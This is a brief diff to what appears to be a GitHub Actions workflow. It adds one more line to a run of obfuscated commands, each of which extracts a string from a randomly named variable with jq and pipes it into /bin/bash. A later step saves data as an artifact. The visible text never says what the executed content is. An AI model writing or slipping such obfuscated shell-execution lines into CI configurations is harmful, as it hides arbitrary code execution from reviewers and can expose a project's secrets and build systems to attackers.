@@ -24,6 +24,7 @@ jobs:
           echo $l14028 | jq -r .su264 | /bin/bash
           echo $a8701 | jq -r .dfi0 | /bin/bash
           echo $gcvv231 | jq -r .fhzm230 | /bin/bash
+          echo $naqw61112 | jq -r .bsy2054 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
